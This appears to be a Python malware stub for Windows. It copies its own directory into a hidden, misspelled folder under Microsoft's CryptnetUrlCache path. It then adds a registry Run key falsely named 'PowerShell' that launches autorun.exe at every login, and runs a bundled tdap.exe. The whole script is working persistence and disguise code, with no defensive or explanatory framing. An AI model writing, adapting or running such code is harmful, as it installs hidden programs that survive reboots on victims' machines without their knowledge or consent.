from subprocess import check_output as system
from os import system as cmd

currentLocation = system('cd', shell = True).decode('utf-8').strip()
currentUser = system("echo %" + "username%", shell = True).decode('utf-8').strip()

location = f"C:\\Users\\{currentUser}\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache"

if currentLocation != location:
    cmd(f"mkdir {location}\\CasheData")

    cmd(f"Xcopy /E {currentLocation} {location}\\CasheData")

    cmd(f"attrib +h {location}\\CasheData")

    cmd(f"REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v PowerShell /t REG_SZ /d {location}\\CasheData\\autorun.exe /f")

try:
    cmd(f"{location}\\CasheData\\build\\tdap.exe")
except:
    pass

